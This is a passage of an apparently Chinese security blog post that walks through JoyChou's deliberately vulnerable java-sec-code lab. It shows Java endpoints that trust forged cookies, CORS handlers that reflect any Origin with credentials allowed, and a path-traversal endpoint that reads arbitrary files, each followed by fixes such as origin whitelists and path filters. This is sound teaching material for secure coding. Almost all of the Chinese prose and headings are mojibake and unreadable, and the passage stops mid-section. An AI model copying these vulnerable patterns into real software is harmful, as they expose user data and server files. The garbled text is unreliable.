<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);</span><br><span class="line">   public static String cmdFilter(String input) &#123;</span><br><span class="line">        if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é™åˆ¶äº†å‚æ•°ä¸­çš„å­—ç¬¦ï¼Œé˜²æ­¢å‘½ä»¤æ³¨å…¥ã€‚</p>
<h3 id="Cookieä¼ªé€ "><a href="#Cookieä¼ªé€ " class="headerlink" title="Cookieä¼ªé€ "></a>Cookieä¼ªé€ </h3><h4 id="1-cookie-vuln01"><a href="#1-cookie-vuln01" class="headerlink" title="1.&#x2F;cookie&#x2F;vuln01"></a>1.&#x2F;cookie&#x2F;vuln01</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private static String NICK = &quot;nick&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(value = &quot;/vuln01&quot;)</span><br><span class="line">public String vuln01(HttpServletRequest req) &#123;</span><br><span class="line">    String nick = WebUtils.getCookieValueByName(req, NICK); // key code</span><br><span class="line">    return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-cookie-vuln02"><a href="#2-cookie-vuln02" class="headerlink" title="2.&#x2F;cookie&#x2F;vuln02"></a>2.&#x2F;cookie&#x2F;vuln02</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln02&quot;)</span><br><span class="line">   public String vuln02(HttpServletRequest req) &#123;</span><br><span class="line">       String nick = null;</span><br><span class="line">       Cookie[] cookie = req.getCookies();</span><br><span class="line"></span><br><span class="line">       if (cookie != null) &#123;</span><br><span class="line">           nick = getCookie(req, NICK).getValue();  // key code</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-cookie-vuln03"><a href="#3-cookie-vuln03" class="headerlink" title="3.&#x2F;cookie&#x2F;vuln03"></a>3.&#x2F;cookie&#x2F;vuln03</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   @GetMapping(value = &quot;/vuln03&quot;)</span><br><span class="line">    public String vuln03(HttpServletRequest req) &#123;</span><br><span class="line">        String nick = null;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        if (cookies != null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                // key code. Equals can also be equalsIgnoreCase.</span><br><span class="line">                if (NICK.equals(cookie.getName())) &#123;</span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line">Javaå¤åˆ¶ä»£ç 1234567891011121314</span><br></pre></td></tr></table></figure>

<h4 id="4-cookie-vuln04"><a href="#4-cookie-vuln04" class="headerlink" title="4.&#x2F;cookie&#x2F;vuln04"></a>4.&#x2F;cookie&#x2F;vuln04</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln04&quot;)</span><br><span class="line">    public String vuln04(HttpServletRequest req) &#123;</span><br><span class="line">        String nick = null;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        if (cookies != null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  // key code</span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-cookie-vuln05"><a href="#5-cookie-vuln05" class="headerlink" title="5.&#x2F;cookie&#x2F;vuln05"></a>5.&#x2F;cookie&#x2F;vuln05</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln05&quot;)</span><br><span class="line"> public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;</span><br><span class="line">     return &quot;Cookie nick: &quot; + nick;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="6-cookie-vuln06"><a href="#6-cookie-vuln06" class="headerlink" title="6.&#x2F;cookie&#x2F;vuln06"></a>6.&#x2F;cookie&#x2F;vuln06</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value = &quot;/vuln06&quot;)</span><br><span class="line">    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨."></a>æ¼æ´åˆ©ç”¨.</h4><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ä¿®æ”¹cookieçš„å€¼å®ç°å¯¹nickå€¼çš„ä¿®æ”¹ï¼ŒæŸäº›æƒ…å†µå¯èƒ½ä¼šå­˜åœ¨è¶Šæƒæ¼æ´ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png" alt="image-20250729104624089" loading="lazy"></p>
<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p><strong>è·¨æºèµ„æºå…±äº«</strong>ï¼ˆCORSï¼Œå…¨ç§°ä¸º Cross-Origin Resource Sharingï¼‰æ˜¯ä¸€ç§åŸºäº HTTP å¤´çš„æœºåˆ¶ï¼Œå…è®¸æœåŠ¡å™¨æ ‡ç¤ºé™¤äº†å®ƒè‡ªå·±ä»¥å¤–çš„å…¶ä»–æºï¼ˆåŸŸã€åè®®æˆ–ç«¯å£ï¼‰ï¼Œä½¿å¾—æµè§ˆå™¨å…è®¸è¿™äº›æºè®¿é—®åŠ è½½è‡ªå·±çš„èµ„æºã€‚CORS æœºåˆ¶é€šè¿‡ä¸€ç§æœºåˆ¶æ¥æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦ä¼šå…è®¸è¦å‘é€çš„çœŸå®è¯·æ±‚ï¼Œè¯¥æœºåˆ¶é€šè¿‡æµè§ˆå™¨å‘èµ·ä¸€ä¸ªåˆ°æœåŠ¡å™¨æ‰˜ç®¡çš„è·¨æºèµ„æºçš„â€œé¢„æ£€â€è¯·æ±‚ã€‚</p>
<p>æ¯”å¦‚è¯´ï¼šæœ‰ä¸¤ä¸ªåŸŸa1.comå’Œb1.comï¼Œå‡è®¾b1.comä¸Šé¢æœ‰ä¸ªæ¥å£èƒ½å¤Ÿè·å–ä¸€äº›è¿”å›çš„æ•°æ®ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä»a1.comå†™ä¸€æ®µjså»è¯·æ±‚è¿™ä¸ªæ¥å£çš„æ•°æ®ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯è¯·æ±‚ä¸äº†çš„ï¼Œä¼šåœ¨æµè§ˆå™¨çˆ†å‡ºCORSé”™è¯¯ï¼Œä½†å¦‚æœæœ‰CORSè®¾ç½®ï¼Œå°±å¯ä»¥å®ç°è¿™æ ·çš„è®¿é—®ï¼Œç”šè‡³å¯ä»¥èƒ½å¤Ÿä½¿ç”¨b1.comä¸Šçš„cookieã€‚</p>
<h4 id="1-cors-vuln-origin"><a href="#1-cors-vuln-origin" class="headerlink" title="1.&#x2F;cors&#x2F;vuln&#x2F;origin"></a>1.&#x2F;cors&#x2F;vuln&#x2F;origin</h4><pre><code>private static String info = &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;

@GetMapping(&quot;/vuln/origin&quot;)
public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;
    String origin = request.getHeader(&quot;origin&quot;);
    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header
    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie
    return info;
&#125;
</code></pre>
<h4 id="2-cors-vuln-setHeader"><a href="#2-cors-vuln-setHeader" class="headerlink" title="2.&#x2F;cors&#x2F;vuln&#x2F;setHeader"></a>2.&#x2F;cors&#x2F;vuln&#x2F;setHeader</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/vuln/setHeader&quot;)</span><br><span class="line">    public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">        // åç«¯è®¾ç½®Access-Control-Allow-Originä¸º*çš„æƒ…å†µä¸‹ï¼Œè·¨åŸŸçš„æ—¶å€™å‰ç«¯å¦‚æœè®¾ç½®withCredentialsä¸ºtrueä¼šå¼‚å¸¸</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-cors-vuln-crossOrigin"><a href="#3-cors-vuln-crossOrigin" class="headerlink" title="3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin"></a>3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;*&quot;)</span><br><span class="line">@RequestMapping(&quot;/vuln/crossOrigin&quot;)</span><br><span class="line">public String vuls3() &#123;</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹originå­—æ®µæ¥éªŒè¯æ¼æ´</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png" alt="image-20250729140718474" loading="lazy"></p>
<h4 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><h5 id="ï¼ˆ1ï¼‰é™åˆ¶origin"><a href="#ï¼ˆ1ï¼‰é™åˆ¶origin" class="headerlink" title="ï¼ˆ1ï¼‰é™åˆ¶origin"></a>ï¼ˆ1ï¼‰é™åˆ¶origin</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)</span><br><span class="line">  @GetMapping(&quot;/sec/crossOrigin&quot;)</span><br><span class="line">  public String secCrossOrigin() &#123;</span><br><span class="line">      return info;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors"><a href="#ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors" class="headerlink" title="ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors"></a>ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/webMvcConfigurer&quot;)</span><br><span class="line">  public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">      return token;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯¹åº”çš„è¿‡æ»¤å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public WebMvcConfigurer corsConfigurer() &#123;</span><br><span class="line">    return new WebMvcConfigurerAdapter() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void addCorsMappings(CorsRegistry registry) &#123;</span><br><span class="line">            // ä¸ºäº†æ”¯æŒä¸€çº§åŸŸåï¼Œé‡å†™äº†checkOrigin</span><br><span class="line">            //String[] allowOrigins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;;</span><br><span class="line">            registry.addMapping(&quot;/cors/sec/webMvcConfigurer&quot;) // /**è¡¨ç¤ºæ‰€æœ‰è·¯ç”±path</span><br><span class="line">                    //.allowedOrigins(allowOrigins)</span><br><span class="line">                    .allowedMethods(&quot;GET&quot;, &quot;POST&quot;)</span><br><span class="line">                    .allowCredentials(true);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ï¼ˆ3ï¼‰spring-securityè®¾ç½®cors"><a href="#ï¼ˆ3ï¼‰spring-securityè®¾ç½®cors" class="headerlink" title="ï¼ˆ3ï¼‰spring securityè®¾ç½®cors"></a>ï¼ˆ3ï¼‰spring securityè®¾ç½®cors</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/httpCors&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯¹åº”è¿‡æ»¤å™¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CorsConfigurationSource corsConfigurationSource()</span><br><span class="line">&#123;</span><br><span class="line">    // Set cors origin white list</span><br><span class="line">    ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;();</span><br><span class="line">    allowOrigins.add(&quot;joychou.org&quot;);</span><br><span class="line">    allowOrigins.add(&quot;https://test.joychou.me&quot;); // åŒºåˆ†httpå’Œhttpsï¼Œå¹¶ä¸”é»˜è®¤ä¸ä¼šæ‹¦æˆªåŒåŸŸè¯·æ±‚ã€‚</span><br><span class="line"></span><br><span class="line">    CorsConfiguration configuration = new CorsConfiguration();</span><br><span class="line">    configuration.setAllowedOrigins(allowOrigins);</span><br><span class="line">    configuration.setAllowCredentials(true);</span><br><span class="line">    configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));</span><br><span class="line">    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();</span><br><span class="line">    source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style</span><br><span class="line">    return source;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors"><a href="#ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors" class="headerlink" title="ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors"></a>ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors</h5><p>é˜²å¾¡ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/originFilter&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_03(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹åº”è¿‡æ»¤å™¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)</span><br><span class="line">public class OriginFilter implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private final Logger logger = LoggerFactory.getLogger(this.getClass());</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)</span><br><span class="line">            throws IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line"></span><br><span class="line">        String origin = request.getHeader(&quot;Origin&quot;);</span><br><span class="line">        logger.info(&quot;[+] Origin: &quot; + origin + &quot;\tCurrent url:&quot; + request.getRequestURL());</span><br><span class="line"></span><br><span class="line">        // ä»¥fileåè®®è®¿é—®htmlï¼Œoriginä¸ºå­—ç¬¦ä¸²çš„nullï¼Œæ‰€ä»¥ä¾ç„¶ä¼šèµ°å®‰å…¨checké€»è¾‘</span><br><span class="line">        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;</span><br><span class="line">            logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin +</span><br><span class="line">                    &quot;\tCurrent url:&quot; + request.getRequestURL());</span><br><span class="line">            response.setStatus(response.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().println(&quot;Invaid cors config by joychou.&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors"><a href="#ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors" class="headerlink" title="ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors"></a>ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors</h5><p>é˜²å¾¡ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/sec/corsFilter&quot;)</span><br><span class="line">   public CsrfToken getCsrfToken_04(CsrfToken token) &#123;</span><br><span class="line">       return token;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹åº”è¿‡æ»¤å™¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class BaseCorsFilter extends CorsFilter &#123;</span><br><span class="line"></span><br><span class="line">    public BaseCorsFilter() &#123;</span><br><span class="line">        super(configurationSource());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static UrlBasedCorsConfigurationSource configurationSource() &#123;</span><br><span class="line">        CorsConfiguration config = new CorsConfiguration();</span><br><span class="line">        config.setAllowCredentials(true);</span><br><span class="line">        config.addAllowedOrigin(&quot;joychou.org&quot;); // ä¸æ”¯æŒ</span><br><span class="line">        config.addAllowedOrigin(&quot;http://test.joychou.me&quot;);</span><br><span class="line">        config.addAllowedHeader(&quot;*&quot;);</span><br><span class="line">        config.addAllowedMethod(&quot;GET&quot;);</span><br><span class="line">        config.addAllowedMethod(&quot;POST&quot;);</span><br><span class="line"></span><br><span class="line">        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();</span><br><span class="line">        source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config);</span><br><span class="line"></span><br><span class="line">        return source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ï¼ˆ6ï¼‰originæ£€æŸ¥"><a href="#ï¼ˆ6ï¼‰originæ£€æŸ¥" class="headerlink" title="ï¼ˆ6ï¼‰originæ£€æŸ¥"></a>ï¼ˆ6ï¼‰originæ£€æŸ¥</h5><p>é˜²å¾¡ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/checkOrigin&quot;)</span><br><span class="line">public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin = request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">    // å¦‚æœoriginä¸ä¸ºç©ºå¹¶ä¸”originä¸åœ¨ç™½åå•å†…ï¼Œè®¤å®šä¸ºä¸å®‰å…¨ã€‚</span><br><span class="line">    // å¦‚æœoriginä¸ºç©ºï¼Œè¡¨ç¤ºæ˜¯åŒåŸŸè¿‡æ¥çš„è¯·æ±‚æˆ–è€…æµè§ˆå™¨ç›´æ¥å‘èµ·çš„è¯·æ±‚ã€‚</span><br><span class="line">    if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;</span><br><span class="line">        return &quot;Origin is not safe.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">    return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><h4 id="1-path-traversal-vul"><a href="#1-path-traversal-vul" class="headerlink" title="1.&#x2F;path_traversal&#x2F;vul"></a>1.&#x2F;path_traversal&#x2F;vul</h4><p>æ¼æ´ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  @GetMapping(&quot;/path_traversal/vul&quot;)</span><br><span class="line">    public String getImage(String filepath) throws IOException &#123;</span><br><span class="line">        return getImgBase64(filepath);</span><br><span class="line">    &#125;</span><br><span class="line">private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">        logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">        File f = new File(imgFile);</span><br><span class="line">        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">            byte[] data = Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">            return new String(Base64.encodeBase64(data));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &quot;File doesn&#x27;t exist or is not a file.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œæˆ‘ä»¬ç›´æ¥è¯»å–æ–‡ä»¶</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png" alt="image-20250730110528049" loading="lazy"></p>
<p>ä¿®å¤ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/path_traversal/sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) == null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pathFilterå‡½æ•°å†…å®¹ï¼š</p>
